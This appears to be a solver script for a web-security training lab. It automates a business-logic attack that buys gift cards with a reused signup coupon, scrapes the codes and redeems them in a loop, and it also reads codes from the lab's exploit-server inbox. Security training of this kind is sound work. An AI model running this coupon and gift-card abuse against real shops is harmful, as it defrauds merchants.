import requests
import re
import time



# for _ in range(45):
#     base_url = 'https://0ab8000603bb50de8120d9c6006400ff.web-security-academy.net'
#     cookie = {"session": "vNBYHrkeOHsMTDXVbtcQXuFTk3ledfVs"}  
#     url1= f"{base_url}/cart"  
#     params1 = {"productId": "2", "redir": "PRODUCT", "quantity":"10"}
#     response = requests.post(url1, cookies=cookie, data=params1)
#     time.sleep(0.3)

#     url2= f"{base_url}/cart/coupon"  
#     params2 = {"csrf": "2J6ob9xfPnfJJTPmci1Txfm9eFCr6I8H", "coupon": "SIGNUP30"}
#     response = requests.post(url2, cookies=cookie, data=params2)
#     time.sleep(0.3)


#     url3= f"{base_url}/cart/checkout"  
#     params3 = {"csrf": "2J6ob9xfPnfJJTPmci1Txfm9eFCr6I8H"}
#     html_content = requests.post(url3, cookies=cookie, data=params3)
#     html_content = html_content.text
#     str(html_content)

#     time.sleep(0.3)


#     td_texts = re.findall(r'<td>(.*?)</td>', html_content, re.DOTALL)

#     for text in td_texts:
#         url5= "https://0ab8000603bb50de8120d9c6006400ff.web-security-academy.net/gift-card"  
#         cookie5 = {"session": "vNBYHrkeOHsMTDXVbtcQXuFTk3ledfVs"}  
#         params5 = {"csrf": "2J6ob9xfPnfJJTPmci1Txfm9eFCr6I8H", "gift-card": f"{text}"}
#         response = requests.post(url5, cookies=cookie5, data=params5)
#         if response.status_code == 400:
#             break
#         print(text, response.status_code)





url = "https://exploit-0a8a00e203e950738186d8eb01040024.exploit-server.net/email"

response = requests.get(url)
html_content = response.text
html_content = str(html_content)
pattern = r"Your gift card code is:\s*(\w+)"
matches = re.findall(pattern, html_content)

if matches:
    for match in matches:
        url5= "https://0ab8000603bb50de8120d9c6006400ff.web-security-academy.net/gift-card"  
        cookie5 = {"session": "vNBYHrkeOHsMTDXVbtcQXuFTk3ledfVs"}  
        params5 = {"csrf": "2J6ob9xfPnfJJTPmci1Txfm9eFCr6I8H", "gift-card": f"{match}"}
        response = requests.post(url5, cookies=cookie5, data=params5)
        print(match, response.status_code)
else:
    print("Gift card code not found")